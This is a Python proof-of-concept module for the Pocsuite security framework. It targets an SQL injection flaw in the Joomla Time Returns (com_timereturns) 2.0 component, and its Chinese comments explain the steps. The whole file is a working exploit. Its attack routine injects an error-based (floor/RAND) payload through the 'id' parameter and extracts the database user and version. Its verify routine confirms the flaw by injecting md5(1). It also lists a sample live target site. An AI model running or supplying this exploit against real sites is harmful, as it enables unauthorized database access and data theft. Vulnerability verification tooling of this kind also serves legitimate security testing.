#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '72200'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2011-11-29'
    createDate = '2016-01-10'
    updateDate = '2016-01-10'
    references = ['http://www.sebug.net/vuldb/ssvid-72200']
    name = 'Joomla Component Time Returns (com_timereturns) 2.0 - SQL Injection'
    appPowerLink = 'http://www.joomla.com'
    appName = 'Joomla Time Returns Component'
    appVersion = '2.0'
    vulType = 'SQL Injection'
    desc = '''
        Joomla!的Time Returns（com_timereturns）组件2.0版本中存在SQL注入漏洞。
        主要是对参数id过滤不严格造成的，远程攻击者可借助id参数执行任意SQL命令。
    '''
    samples = ['http://www.110xo.com/page/service']

    def _attack(self):
        #利用floor回显报错的方式，读取数据库信息
        result = {}
        payload="1' AND (SELECT 1222 FROM(SELECT COUNT(*),"\
        "CONCAT(0x247e7e7e24,user(),0x2a2a2a,version(),0x247e7e7e24,"\
        "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YLvB'='YLvB"
        exploit="/index.php?option=com_timereturns&view=timereturns&id="
        #提取信息的正则表达式
        pars="\$~~~\$([_a-zA-Z0-9].*)\*\*\*(.*)\$~~~\$"
        #构造访问地址
        vulurl=self.url+exploit+payload
        #自定义的HTTP
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #尝试访问
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查
        if 'Duplicate entry' in resp.content:
            #尝试提取信息
            match=re.search(pars,resp.content,re.I|re.M)
            if match:
                #记录数据库信息
                result['DatabaseInfo']={}
                #数据库用户名
                result['DatabaseInfo']['Username']=match.group(1)
                #数据库版本
                result['DatabaseInfo']['Version']=match.group(2)
        return self.parse_output(result)

    def _verify(self):
        #利用注入漏洞计算md5(1)
        result = {}
        #利用的payload(利用的是floor回显报错的方式)
        payload="1' AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT(md5(1),"\
        "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YLvB'='YLvB"
        #漏洞页面
        exploit='/index.php?option=com_timereturns&view=timereturns&id='
        #构造访问地址
        vulurl=self.url+exploit+payload
        #自定义的HTTP
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #尝试访问
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串(md5(1)=c4ca4238a0b923820dcc509a6f75849b)
        if 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)